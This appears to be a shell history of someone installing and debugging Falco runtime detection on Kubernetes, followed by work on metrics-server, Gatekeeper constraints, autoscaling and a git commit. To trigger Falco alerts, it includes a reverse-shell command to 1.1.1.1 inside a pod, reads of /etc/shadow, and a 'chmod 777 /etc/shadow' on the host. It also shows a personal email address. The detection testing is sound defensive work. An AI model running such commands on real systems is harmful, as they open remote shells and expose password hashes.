kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=50
kubectl get pod falco-jwwdh -n falco -o wide
kubectl get pod nginx -o wide
kubectl exec -it falco-jwwdh -n falco -c falco -- sh
kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=50
kubectl exec -it falco-jwwdh -n falco -c falco -- sh
kubectl exec -it nginx -- sh -c "sleep 60"
kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=50
kubectl exec -it nginx -- sh
kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=50
kubectl exec -it nginx -- sh
kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=50
kubectl exec -it nginx -- sh
kubectl logs -n falco -l app.kubernetes.io/name=falco --since=10m
kubectl logs -n falco -l app.kubernetes.io/name=falco | grep -i etc
kubectl exec -it nginx -- sh
kubectl logs -n falco -l app.kubernetes.io/name=falco --since=1m
kubectl get pods
kubectl exec -n falco -it ds/falco -- grep -R "priority:" /etc/falco/falco.yaml
kubectl exec -n falco -it ds/falco -- grep -n "Write below etc" /etc/falco/falco_rules.yaml -n
kubectl exec -n falco -it ds/falco -- sed -n 'START_LINE,END_LINEp' /etc/falco/falco_rules.yaml
kubectl get pods
kubectl exec -it nginx -- sh
kubectl logs -n falco -l app.kubernetes.io/name=falco --since=2m
kubectl logs -n falco -l app.kubernetes.io/name=falco | grep -i -E "driver|bpf|probe"
kubectl get ds falco -n falco -o yaml | grep -A5 securityContext
kubectl get pods -n falco
kubectl describe pod falco-jwwdh -n flaco
kubectl describe pod falco-jwwdh -n falco
kubectl exec -it falco-jwwdh -n falco -c falco -- ls -l /etc/falco
kubectl exec -it falco-jwwdh -n falco -c falco -- falco --support | grep container
kubectl exec -it nginx -- sh
kubectl logs -n falco falco-jwwdh --since=1m
sudo chmod 777 /etc/shadow
kubectl logs -n falco falco-jwwdh --since=1m
kubectl exec -it nginx -- sh
kubectl logs -n falco falco-jwwdh | grep -i "event"
kubectl exec -it falco-jwwdh -n falco -c falco -- falco --support
helm upgrade falco falcosecurity/falco   -n falco   --set driver.kind=ebpf
kubectl rollout restart ds/falco -n falco
kubectl get pods -n falco
kubectl get pod -n falco
kubectl get pods
kubectl get pods -n pods
kubectl get pods -n falco
kubectl get ns
kubectl get pods -A | grep falco
kubectl get ds -A | grep falco
kubectl describe ds falco -n falco
kubectl get pods -n flaco
kubectl get pods -n falco
helm upgrade falco falcosecurity/falco   -n falco   -f values.yaml
ls
helm upgrade falco falcosecurity/falco   -n falco   -f falco-values.yaml
kubectl get pods -n falco
kubectl get ds -A | grep falco
kubectl get pods -A | grep falco
kubectl logs -n falco falco-4dwcc -c falco | grep "Falco initialized"
kubectl run test-shell --image=busybox -it --rm -- sh
kubectl get pods
kubectl exec -it busybox-limit-test -- sh
kubectl logs -n falco falco-4dwcc -c falco | grep shadow
kubectl logs -n falco falco-4dwcc -c falco | grep "Loading rules"
kubectl logs -n falco falco-4dwcc -c falco | grep -i ".yaml"
kubectl logs -n falco falco-4dwcc -c falco | grep -i "loaded"
kubectl logs -n falco falco-4dwcc -c falco
kubectl exec -n falco falco-4dwcc -c falco -- wc -l /etc/falco/falco_rules.yaml
kubectl exec -it busybox-limit-test -- sh
kubectl logs -n falco falco-4dwcc -c falco | tail -20
kubectl exec -n falco falco-4dwcc -c falco -- grep -A5 "stdout_output" /etc/falco/falco.yaml
sudo ls /sys/kernel/debug/tracing
helm upgrade falco falcosecurity/falco   -n falco   --set driver.kind=ebpf   --set falcoctl.artifact.install.enabled=true   --set falcoctl.artifact.follow.enabled=true   --set falcoctl.artifact.follow.resources.limits.cpu=100m   --set falcoctl.artifact.follow.resources.limits.memory=128Mi   --set falcoctl.artifact.install.resources.limits.cpu=100m   --set falcoctl.artifact.install.resources.limits.memory=128Mi   --set falco.stdoutOutput.enabled=true   --set falco.logLevel=info
kubectl get pods -n falco
kubectl get pods -n falco -w
kubectl get pods -n falco
kubectl logs -n falco falco-spdc9 -c falco | grep -i probe
kubectl exec -it busybox-limit-test -- sh
kubectl logs -n falco <new-pod> -c falco | tail -20
kubectl logs -n falco falco-spdc9 -c falco | tail -20
kubectl get pods
kubectl exec -it busybox-limit-test -- sh
kubectl logs -n falco falco-spdc9 -c falco | tail -50
sudo cat /sys/kernel/security/lockdown
sudo sysctl kernel.unprivileged_bpf_disabled
helm upgrade falco falcosecurity/falco   -n falco   --set driver.kind=module
kubectl get pods -n falco -w
kubectl get pods -n falco
kubectl get ns
kubectl get ds -n falco
kubectl describe ds falco -n falco
ls
nano falco-values.yaml
helm upgrade falco falcosecurity/falco   -n falco   -f falco-values.yaml
kubectl get pods -n falco
kubectl logs -n falco falco-tnl2v -c falco | grep -i module
kubectl exec -it falco-tnl2v -- sh
kubectl get pods
kubectl exec -it busybox-limit-test -- sh
kubectl logs -n falco falco-tnl2v -c falco | tail -50
kubectl exec -it busybox-limit-test -- wget http://example.com
kubectl logs -n falco falco-tnl2v -c falco | tail -50
ls
nano falco-values.yaml
helm upgrade falco falcosecurity/falco -n falco -f falco-values.yaml
kubectl get pods -n falco
kubectl logs -n falco <pod-name> -c falco | head -30
kubectl logs -n falco falco-tnl2v -c falco | head -30
nano falco-values.yaml
helm upgrade falco falcosecurity/falco -n falco -f falco-values.yaml
kubectl get pods -n falco
kubectl logs -n falco falco-tnl2v -c falco | head -40
kubectl exec -n falco falco-tnl2v -c falco -- grep log_level /etc/falco/falco.yaml
nano falco-values.yaml
helm upgrade falco falcosecurity/falco -n falco -f falco-values.yaml
kubectl get pods -n falco
kubectl exec -n falco falco-tnl2v -c falco -- grep log_level /etc/falco/falco.yaml
kubectl exec -n falco falco-h99q -c falco -- grep log_level /etc/falco/falco.yaml
kubectl exec -n falco falco-h994q -c falco -- grep log_level /etc/falco/falco.yaml
nano falco-values.yaml
helm upgrade falco falcosecurity/falco -n falco -f falco-values.yaml
kubectl get pods -n falco
kubectl exec -n falco falco-z4s28 -c falco -- grep log_level /etc/falco/falco.yaml
kubectl logs -n falco falco-z4s28 -c falco | grep -i debug | head
kubectl logs -n falco falco-z4s28 -c falco | head -50
kubectl logs -n falco falco-z4s28 -c falco | grep "Falco version"
nano falco-values.yaml
helm upgrade falco falcosecurity/falco -n falco -f falco-values.yaml
kubectl get pods -n falco
kubectl logs -n falco falco-cmhqn -c falco | head -50
kubectl get pods
kubectl exec -it busybox-limit-test -- sh
kubectl logs -n falco falco-cmhqn -c falco | head -50
kubectl exec -it nginx -- bash
kubectl logs -n falco falco-cmhqn -c falco | grep -i "Terminal shell"
kubectl exec -it nginx -- bash
kubectl logs -n falco falco-cmhqn -c falco | grep -A5 -B2 nginx
kubectl logs -n falco falco-cmhqn -c falco | grep -i "Warning"
kubectl exec -it nginx -- sh -c "nc -e /bin/sh 1.1.1.1 4444"
kubectl exec -it nginx -- sh -c "touch /root/testfile"
kubectl logs -n falco falco-cmhqn -c falco | tail -20
kubectl logs -n falco falco-cmhqn -c falco | grep "Opening"
kubectl logs -n falco falco-cmhqn -c falco | grep container.id
kubectl exec -n falco falco-cmhqn -c falco -- ls -l /host/run/containerd/
kubectl get pod nginx -o wide
kubectl get pod -n falco -o wide
nano falco-values.yaml
helm upgrade falco falcosecurity/falco   -n falco   -f falco-values.yaml
kubectl get pods -n falco
kubectl logs -n falco -c falco falco-fsrsd | grep container.id
kubectl exec -it nginx -- sh
kubectl logs -n falco falco-fsrsd -c falco | tail -20
kubectl logs -n falco falco-fsrsd -c falco | tail -50
kubectl logs -n falco falco-fsrsd -c falco | tail -80
kubectl logs -n falco falco-fsrsd -c falco | grep k8s
nano falco-values.yaml
helm upgrade falco falcosecurity/falco   -n falco   -f falco-values.yaml
kubectl get pods -n falco
kubectl logs -n falco falco-fsrsd -c falco | grep "Kubernetes"
nano falco-values.yaml
helm upgrade falco falcosecurity/falco   -n falco   -f falco-values.yaml
kubectl get pods -n falco
kubectl logs -n falco falco-fsrsd -c falco | grep "Kubernetes"
kubectl describe pod falco-fsrsd -n falco | grep ServiceAccount
kubectl exec -n falco falco-fsrsd -c falco -- ls -l /host/run/host-containerd/
nano falco-values.yaml
helm upgrade falco falcosecurity/falco -n falco -f falco-values.yaml
kubectl get pods -n falco
lds
ls
nano falco-values.yaml
helm upgrade falco falcosecurity/falco -n falco -f falco-values.yaml
kubectl get pods -n falco
kubectl logs -n falco <new-pod> -c falco | grep -i ebpf
kubectl logs -n falco falco-t5cnf -c falco | grep -i ebpf
kubectl logs -n falco falco-t5cnf -c falco | grep Opening
sudo ls -l /run/containerd/containerd.sock
sudo ls -l /var/run/containerd/containerd.sock
kubectl get pods -n falco
kubectl exec -it nginx -- sh
kubectl logs -n falco falco-t5cnf -c falco | grep container.id
kubectl get pods
kubectl get pods -n falco
kubectl logs -n falco falco-t5cnf -c falco | grep container.id
ls
nano falco-values.yaml
helm upgrade falco falcosecurity/falco -n falco -f falco-values.yaml
kubectl get pods -n falco -w
kubectl logs -n falco falco-lg9k6 -c falco | grep Opening
kubectl get pods
kubectl exec -it nginx -- sh
kubectl logs -n falco falco-lg9k6 -c falco | grep Opening
kubectl logs -n falco falco-lg9k6 -c falco | grep Container.id
kubectl logs -n falco falco-lg9k6 -c falco | grep "Loaded rules"
kubectl logs -n falco falco-lg9k6 -c falco | tail -60
kubectl exec -it --user 1000:1000 nginx -- sh
kubectl get pods
kubectl exec -it nginx -- sh
kubectl get pods -n falco
kubectl logs -n falco falco-lg9k6 -c falco | tail -60
kubectl exec -it nginx -- sh -c "cat /etc/shadow"
kubectl logs -n falco falco-lg9k6 -c falco | tail -20
kubectl get pods -n falco
kubectl delete namespace falco
kubectl get pods -n falco
helm install --replace falco --namespace falco --create-namespace --set tty=true falcosecurity/falco
kubectl get pods -n falco -w
kubectl get pods -n falco
helm install falco falcosecurity/falco   --namespace falco   --create-namespace   --set tty=true
kubectl get ns
kubectl get pods -n falco
helm uninstall falco -n falco
kubectl get ns
kubectl delete namespace falco
kubectl get ns
helm install falco falcosecurity/falco   --namespace falco   --create-namespace   --set tty=true
kubectl get pods -n falco
kubectl get ds -n falco
ls
kubectl get ns
helm upgrade falco falcosecurity/falco   -n falco   -f falco-values.yaml
kubectl ge pods -n falco
kubectl get pods -n falco
kubectl logs -n falco falco-4dnjg -c falco | head 60
kubectl logs -n falco falco-4dnjg -c falco | head -60
kubectl logs -n falco falco-4dnjg -c falco | tail -60
kubectl get pods -n falco
kubectl exec -it falco-4dnjg -- sh
kubectl -n falco exec -it falco-4dnjg -- sh
kubectl get pods -n falco -o wide
kubectl logs -n falco -l app.kubernetes.io/name=falco
kubectl get pods
kubectl exec -it nginx -- sh
kubectl logs -n falco -l app.kubernetes.io/name=falco | grep -i shell
kubectl get pods -n falco
kubectl -n falco exec -it falco-4dnjg -- sh 
helm upgrade falco falcosecurity/falco   -n falco   --set falcoctl.artifact.install.enabled=true   --set falcoctl.artifact.follow.enabled=true
kubectl get pods -n falco
kubectl get all -n falco
helm uninstall falco -n falco
nano falco-values.yaml
helm upgrade falco falcosecurity/falco   -n falco   -f falco-values.yaml
helm install falco falcosecurity/falco   -n falco   --create-namespace   -f falco-values.yaml
kubectl get pods -n falco
kubectl logs -n falco -l app.kubernetes.io/name=falco | grep "enabled rules"
nano falco-values.yaml
helm upgrade falco falcosecurity/falco   -n falco   -f falco-values.yaml
nano falco-values.yaml
helm upgrade falco falcosecurity/falco   -n falco   -f falco-values.yaml
kubectl get pods -n falco
kubectl get svc -n falco
kubectl logs -n falco -l app.kubernetes.io/name=falco | grep "enabled rules"
nano  falco-values.yaml
helm upgrade falco falcosecurity/falco   -n falco   -f falco-values.yaml
kubectl get pods -n falco
kubectl logs -n falco falco-pdvbh -c falcoctl-artifact-install
kubectl logs -n falco -l app.kubernetes.io/name=falco | grep "enabled rules"
nano falco-values.yaml
helm upgrade falco falcosecurity/falco   -n falco   -f falco-values.yaml
kubectl get pods -n falco
kubectl logs -n falco -l app.kubernetes.io/name=falco | grep "enabled rules"
nano falco-values.yaml
helm upgrade falco falcosecurity/falco   -n falco   -f falco-values.yaml
kubectl get pods -n falco
kubectl logs -n falco -l app.kubernetes.io/name=falco | grep "enabled rules"
kubectl get pods -n falco
kubectl -n falco exec -it falco-zzd2l -- sh
nano falco-values.yaml
helm uninstall falco -n falco
kubectl delete namespace falco
kubectl get ns
helm install falco falcosecurity/falco   -n falco   --create-namespace   -f falco-values.yaml
kubectl get pods -n falco
kubectl logs -n falco -l app.kubernetes.io/name=falco | grep "enabled rules"
kubectl exec -n falco -it falco-mx5mt -c falco -- sh
kubectl exec -n falco -it falco-mx5mt -c falcoctl-artifact-install -- sh
kubectl get pods -n falco
kubectl describe pod falco-mx5mt -n falco
kubectl describe pod falco-mx5mt -n falco | grep -A5 Mounts
cat /etc/shadow
kubectl delete nginx
kubectl get pods
kubectl delete pod ninx
kubectl delete pod nginx
kubectl get pods
kubectl get svc
ls
kubectl apply -f nginx.yaml
kubectl get pods
kubectl exec -it nginx -- sh
sudo systemctl stop falco 2>/dev/null
sudo apt remove -y falco 2>/dev/null
sudo rm -f /etc/apt/sources.list.d/falcosecurity.list
helm uninstall falco -n falco 2>/dev/null
kubectl delete namespace falco 2>/dev/null
curl -fsSL https://falco.org/repo/falcosecurity-packages.asc |   sudo gpg --dearmor -o /usr/share/keyrings/falco-archive-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/falco-archive-keyring.gpg] https://download.falco.org/packages/deb stable main" | sudo tee /etc/apt/sources.list.d/falcosecurity.list
sudo apt update
sudo apt install -y falco
ls
sudo nano /etc/falco/falco.yaml
sudo systemctl enable falco
sudo systemctl start falco
sudo systemctl status falco
sudo journalctl -u falco -f
falco
kubectl get pods
kubectl exec -it nginx -- sh
falco
ls
cat /etc/shadow
falco
sudo journalctl -u falco -f
falco
sudo systemctl status falco
sudo journalctl -u falco-modern-bpf -f
kubectl get pods
kubectl exec -it nginx -- sh
sudo nano /etc/falco/falco_rules.local.yaml
sudo systemctl restart falco-modern-bpf
sudo systemctl status falco-modern-bpf
sudo journalctl -u falco-modern-bpf -n 50 --no-pager
sudo nano /etc/falco/falco_rules.local.yaml
sudo falco --validate /etc/falco/falco.yaml
cat -n /etc/falco/falco_rules.local.yaml
sudo nano /etc/falco/falco_rules.local.yaml
sudo falco validate
sudo systemctl restart falco-modern-bpf
sudo systemctl status falco-modern-bpf
kubectl get pods
sudo journalctl -u falco-modern-bpf -f
kubectl apply -f https://github.com/kubernetes-sigs/metrics-server/releases/latest/download/components.yaml
kubectl patch deployment metrics-server -n kube-system   --type='json'   -p='[{"op":"add","path":"/spec/template/spec/containers/0/args/-","value":"--kubelet-insecure-tls"}]'
kubectl top nodes
kubectl top pods
kubectl get pods -n kube-system
kubectl get deployment -n kube-system
kubectl describe pod metrics-server -n kube-system
kubectl get rs -n kube-system | grep metrics
kubectl describe rs metrics-server-845d86dc79 -n kube-system
ls
kubectl edit k8sresourcelimits require-resource-limits
KUBE_EDITOR=nano kubectl edit k8sresourcelimits require-resource-limits
KUBE_EDITOR=nano kubectl edit k8sallowedregistries only-acr-images
kubectl rollout restart deployment metrics-server -n kube-system
kubectl get pods -n kube-system
kubectl top pods
kubectl top nodes
KUBE_EDITOR=nano kubectl edit k8sresourcelimits require-resource-limits
cat kubectl edit k8sresourcelimits require-resource-limits
cat k8sresourcelimits require-resource-limits
cat k8sresourcelimits
kubectl get k8sresourcelimits require-resource-limits -o yaml
kubectl get  k8sallowedregistries only-acr-images
kubectl get k8sallowedregistries only-acr-images -o yaml
kubectl create namespace autoscale
cat <<EOF | kubectl apply -n autoscale -f -
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web
spec:
  replicas: 1
  selector:
    matchLabels:
      app: web
  template:
    metadata:
      labels:
        app: web
    spec:
      containers:
      - name: web
        image: nginx
        resources:
          requests:
            cpu: 100m
          limits:
            cpu: 500m
---
apiVersion: v1
kind: Service
metadata:
  name: web
spec:
  type: ClusterIP
  selector:
    app: web
  ports:
  - port: 80
EOF

kuubectl get pods -n autoscale
kubectl get pods -n autoscale
ls
nano constraints.yaml
kubectl get pods -n autoscale
kubectl get ns
cat <<EOF | kubectl apply -n autoscale -f -
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web
spec:
  replicas: 1
  selector:
    matchLabels:
      app: web
  template:
    metadata:
      labels:
        app: web
    spec:
      containers:
      - name: web
        image: nginx
        resources:
          requests:
            cpu: 100m
          limits:
            cpu: 500m
---
apiVersion: v1
kind: Service
metadata:
  name: web
spec:
  type: ClusterIP
  selector:
    app: web
  ports:
  - port: 80
EOF


cat constrainsts.yaml
cat constraints.yaml
kubectl get k8sallowedregistries only-acr-images -o yaml
cat <<EOF | kubectl apply -n autoscale -f -
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web
spec:
  replicas: 1
  selector:
    matchLabels:
      app: web
  template:
    metadata:
      labels:
        app: web
    spec:
      containers:
      - name: web
        image: nginx
        resources:
          requests:
            cpu: 100m
          limits:
            cpu: 500m
---
apiVersion: v1
kind: Service
metadata:
  name: web
spec:
  type: ClusterIP
  selector:
    app: web
  ports:
  - port: 80
EOF

kubectl apply -f constraints.yaml
kubectl get k8sallowedregistries only-acr-images -o yaml
cat <<EOF | kubectl apply -n autoscale -f -
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web
spec:
  replicas: 1
  selector:
    matchLabels:
      app: web
  template:
    metadata:
      labels:
        app: web
    spec:
      containers:
      - name: web
        image: nginx
        resources:
          requests:
            cpu: 100m
          limits:
            cpu: 500m
---
apiVersion: v1
kind: Service
metadata:
  name: web
spec:
  type: ClusterIP
  selector:
    app: web
  ports:
  - port: 80
EOF

kubectl get pods -n autoscale
kubectl delete deployment web -n autoscale
kubectl delete service web -n autoscale
kubectl get all -n autoscale
cat <<EOF | kubectl apply -n autoscale -f -
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web
spec:
  replicas: 1
  selector:
    matchLabels:
      app: web
  template:
    metadata:
      labels:
        app: web
    spec:
      containers:
      - name: web
        image: docker.io/nginx:latest
        resources:
          requests:
            cpu: 100m
          limits:
            cpu: 500m
---
apiVersion: v1
kind: Service
metadata:
  name: web
spec:
  type: ClusterIP
  selector:
    app: web
  ports:
  - port: 80
    targetPort: 80
EOF

kubectl get pods -n autoscale
kubectl delete deployment web -n autoscale
kubectl delete service web -n autoscale
kubectl get all -n autoscale
nano web.yaml
kubectl apply -f web.yaml
kubectl get pods -n autoscale
kubectl get rs -n autoscale
KUBE_EDITOR=nano kubectl edit k8sallowedregistries only-acr-images
KUBE_EDITOR=nano kubectl edit k8sresourcelimits require-resource-limits
kubectl get k8sresourcelimits require-resource-limits -o yaml
ls
kubectl apply -f web.yaml
kubectl get  pods
kubectl get pods -n autoscale
kubectl get svc -n autoscale
kubectl get ns
kubectl get pods -n autoscale
kubectl get svc -n autoscale
kubectl get deploy -n autoscale
kubectl describe deploy web -n autoscale
kubectl get rs -n autoscale
nano constraints.yaml
kubectl apply -f constraints.yaml
kubectl get k8sallowedregistries only-acr-images -o yaml
ls
kubectl apply -f web.yaml
kubectl get pods -n autoscale
kubectl describe rs web-565c7bcc8c -n autoscale
nano web.yaml
kubectl apply -f web.yaml
kubectl get pods -n autoscale
cat web.yaml
kubectl get pods -n autoscale
kubectl autoscale deployment web   --cpu-percent=50   --min=1   --max=10   -n autoscale
kubectl get hpa -n autoscale
kubectl run -i --tty load-generator   --rm --image=busybox   -n autoscale -- /bin/sh
kubectl get pods -n autoscale -w
kubectl get hpa -n autoscale
git clone https://github.com/kubernetes/autoscaler.git
cd autoscaler/vertical-pod-autoscaler
./hack/vpa-up.sh
kubectl get pods -n kube-system | grep vpa
kubectl describe pod vpa-admission-controller-5b65b5594-49lsh -n kube-system
kubectl describe node $(kubectl get nodes -o name | cut -d/ -f2)
KUBE_EDITOR=nano kubectl edit deploy vpa-admission-controller -n kube-system
kubectl get deploy vpa-admission-controller -n kube-system
kubectl get deploy vpa-admission-controller -n kube-system -o yaml
kubectl patch deployment vpa-admission-controller   -n kube-system   --type='json'   -p='[
    {
      "op": "replace",
      "path": "/spec/template/spec/containers/0/resources/requests/cpu",
      "value": "10m"
    },
    {
      "op": "replace",
      "path": "/spec/template/spec/containers/0/resources/requests/memory",
      "value": "100Mi"
    },
    {
      "op": "replace",
      "path": "/spec/template/spec/containers/0/resources/limits/cpu",
      "value": "100m"
    },
    {
      "op": "replace",
      "path": "/spec/template/spec/containers/0/resources/limits/memory",
      "value": "300Mi"
    }
  ]'
kubectl delete pod -n kube-system -l app=vpa-admission-controller
kubectl get pods -n kube-system | grep vpa
kubectl delete pod -n kube-system -l app=vpa-admission-controller
kubectl get pods -n kube-system | grep vpa
kubectl describe pods vpa-admission-controller-5b65b5594-9jfv7
kubectl get pods -n kube-system | grep vpa
kubectl delete pod -n kube-system -l app=vpa-admission-controller
kubectl get pods -n kube-system | grep vpa
kubectl get deploy vpa-admission-controller -n kube-system -o yaml
ls
zip -r all-files.zip .
supd apt install zip
sudo apt install zip
sudo apt update
zip -r all-files.zip .
ls
cat gateway.yaml
ls
exit
ls
git --version
ls
git config --global user.name "Vi20sept"
git config --global user.email "simt05nov@gmail.com"
git config --list
git init
git status
git add all-files.zip
git status
git commit -m "Added zip files"
git branch
